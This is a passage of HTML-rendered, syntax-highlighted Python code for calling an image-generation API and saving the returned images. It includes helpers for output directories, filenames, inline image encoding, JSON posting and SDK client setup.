&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;VALID_RESOLUTIONS&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;1K&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;2K&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;4K&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;def _resolve_output_dir&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;output_dir: str, mkdir: bool&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; -&amp;gt; str:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; os.path.isdir&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;output_dir&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; output_dir
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; mkdir:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        os.makedirs&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;output_dir, &lt;span class=&#34;nv&#34;&gt;exist_ok&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;True&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; output_dir
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    print&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;f&lt;span class=&#34;s2&#34;&gt;&amp;#34;Warning: Output directory not found: {output_dir}. Saving to current directory.&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;.&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;def _build_filename&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;output_name: str &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; None, timestamp: str, index: int, default_ext: str&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; -&amp;gt; str:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; output_name:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        root, &lt;span class=&#34;nv&#34;&gt;ext&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; os.path.splitext&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;output_name&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; not ext:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;nv&#34;&gt;ext&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; default_ext
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nv&#34;&gt;suffix&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; f&lt;span class=&#34;s2&#34;&gt;&amp;#34;_{index}&amp;#34;&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; index &amp;gt; &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; f&lt;span class=&#34;s2&#34;&gt;&amp;#34;{root}{suffix}{ext}&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; f&lt;span class=&#34;s2&#34;&gt;&amp;#34;generated_{timestamp}_{index}{default_ext}&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;def _load_image_inline&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;image_path: str&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; -&amp;gt; dict:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    mime_type, &lt;span class=&#34;nv&#34;&gt;_&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; guess_type&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;image_path&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; mime_type is None:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nv&#34;&gt;mime_type&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;image/png&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nv&#34;&gt;data&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; Path&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;image_path&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.read_bytes&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;inlineData&amp;#34;&lt;/span&gt;: &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;mimeType&amp;#34;&lt;/span&gt;: mime_type, &lt;span class=&#34;s2&#34;&gt;&amp;#34;data&amp;#34;&lt;/span&gt;: base64.b64encode&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;data&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.decode&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;ascii&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)}}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;def _post_json&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;url: str, body: dict&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; -&amp;gt; dict:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nv&#34;&gt;data&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; json.dumps&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;body&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.encode&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;utf-8&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nv&#34;&gt;req&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; request.Request&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        url,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nv&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;data,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nv&#34;&gt;headers&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;={&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Content-Type&amp;#34;&lt;/span&gt;: &lt;span class=&#34;s2&#34;&gt;&amp;#34;application/json&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;x-goog-api-key&amp;#34;&lt;/span&gt;: API_KEY&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nv&#34;&gt;resp&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; request.urlopen&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;req&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.read&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; json.loads&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;resp&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;def _save_images&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;parts, output_dir: str, &lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;: str, output_name: str &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; None, mkdir: bool&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; -&amp;gt; list&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;str&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nv&#34;&gt;imgs&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;p&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;inlineData&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; p in parts &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;inlineData&amp;#34;&lt;/span&gt; in p&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; not imgs:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;first&amp;#34;&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nv&#34;&gt;imgs&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; imgs&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;:1&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;elif&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;last&amp;#34;&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nv&#34;&gt;imgs&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; imgs&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-1:&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;elif&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;max_res&amp;#34;&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nv&#34;&gt;imgs&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; imgs&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-1:&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nv&#34;&gt;ts&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; datetime.now&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt;.strftime&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;%Y%m%d_%H%M%S&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nv&#34;&gt;output_dir&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; _resolve_output_dir&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;output_dir, mkdir&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nv&#34;&gt;saved&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; i, img in enumerate&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;imgs&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nv&#34;&gt;data&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; base64.b64decode&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;img&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;data&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;])&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nv&#34;&gt;ext&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;jpg&amp;#34;&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; img.get&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;mimeType&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.endswith&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;jpeg&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;png&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nv&#34;&gt;filename&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; _build_filename&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;output_name, ts, i, f&lt;span class=&#34;s2&#34;&gt;&amp;#34;.{ext}&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nv&#34;&gt;path&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; Path&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;output_dir&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; / filename
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        path.write_bytes&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;data&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        saved.append&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;str&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;path&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; saved
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;def _sdk_generate&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;prompt: str, output_dir: str, aspect_ratio: str, resolution: str, input_image: str &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; None,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                  output_name: str &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; None, mkdir: bool, &lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;: str&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; -&amp;gt; list&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;str&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; genai is None or types is None:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        print&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Error: google-genai is not installed.&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nv&#34;&gt;client_kwargs&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;api_key&amp;#34;&lt;/span&gt;: API_KEY&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; API_BASE_URL:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        client_kwargs&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;http_options&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;base_url&amp;#34;&lt;/span&gt;: API_BASE_URL&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nv&#34;&gt;client&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; genai.Client&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;**client_kwargs&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; input_image:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; not Path&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;input_image&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.exists&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            print&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;f&lt;span class=&#34;s2&#34;&gt;&amp;#34;Error: Input image not found: {input_image}&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        with open&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;input_image, &lt;span class=&#34;s2&#34;&gt;&amp;#34;rb&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; as f:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;nv&#34;&gt;image_bytes&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; f.read&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        mime_type, &lt;span class=&#34;nv&#34;&gt;_&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; guess_type&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;input_image&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; mime_type is None:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;nv&#34;&gt;mime_type&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;image/png&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nv&#34;&gt;image_part&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; types.Part.from_bytes&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;image_bytes, &lt;span class=&#34;nv&#34;&gt;mime_type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;mime_type&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
